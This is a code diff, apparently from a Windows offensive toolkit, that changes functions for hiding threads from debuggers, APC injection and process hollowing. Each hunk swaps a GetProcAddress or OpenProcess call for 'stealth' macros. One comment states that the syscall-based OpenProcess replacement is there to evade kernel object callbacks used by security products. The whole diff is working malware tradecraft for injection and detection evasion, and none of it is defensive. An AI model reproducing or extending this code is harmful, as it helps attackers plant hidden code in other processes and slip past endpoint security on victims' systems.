@@ -544,7 +544,7 @@ bool StealthThread::HideThreadFromDebugger(HANDLE hThread) {
         HANDLE, ULONG, PVOID, ULONG);
 
     static auto NtSetInformationThread = reinterpret_cast<NtSetInformationThread_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtSetInformationThread"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtSetInformationThread"));
 
     if (!NtSetInformationThread) return false;
 
@@ -566,7 +566,7 @@ bool StealthThread::SetThreadStackBase(HANDLE hThread, PVOID stackBase) {
         HANDLE, ULONG, PVOID, ULONG, PULONG);
 
     static auto NtQueryInformationThread = reinterpret_cast<NtQueryInformationThread_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationThread"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationThread"));
 
     if (!NtQueryInformationThread) return false;
 
@@ -685,7 +685,7 @@ bool APCInjector::InjectToThreadSyscall(HANDLE hThread,
     using NtQueryInformationThread_t = NTSTATUS(NTAPI*)(
         HANDLE, ULONG, PVOID, ULONG, PULONG);
     static auto NtQIT = reinterpret_cast<NtQueryInformationThread_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationThread"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationThread"));
 
     HANDLE hTargetProcess = GetCurrentProcess(); // 默认当前进程
 
@@ -693,9 +693,9 @@ bool APCInjector::InjectToThreadSyscall(HANDLE hThread,
         ULONG retLen;
         NTSTATUS st = NtQIT(hThread, 0, &tbi, sizeof(tbi), &retLen);
         if (NT_SUCCESS(st) && tbi.ClientId.UniqueProcess) {
-            hTargetProcess = OpenProcess(
+            // ★ BUILD 551: OpenProcess → STEALTH_OPEN_PROCESS (syscall 替代, 规避 ObCallbacks)
+            STEALTH_OPEN_PROCESS(hTargetProcess,
                 PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
-                FALSE,
                 GetProcessIdOfThread(hThread));
             if (!hTargetProcess) {
                 hTargetProcess = GetCurrentProcess();
@@ -719,7 +719,7 @@ bool APCInjector::InjectToThreadSyscall(HANDLE hThread,
         HANDLE, PVOID, PVOID, PVOID, PVOID);
 
     static auto NtQueueApcThread = reinterpret_cast<NtQueueApcThread_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueueApcThread"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueueApcThread"));
 
     if (!NtQueueApcThread) return false;
 
@@ -777,7 +777,7 @@ bool ProcessHollower::HollowSuspended(
         HANDLE, ULONG, PVOID, ULONG, PULONG);
 
     static auto NtQIP = reinterpret_cast<NtQueryInformationProcess_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationProcess"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationProcess"));
 
     if (!NtQIP) return false;
 
@@ -795,7 +795,7 @@ bool ProcessHollower::HollowSuspended(
     // 4. 取消映射原始 PE
     using NtUnmapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, PVOID);
     static auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtUnmapViewOfSection"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtUnmapViewOfSection"));
 
     if (!NtUnmapViewOfSection) return false;
 
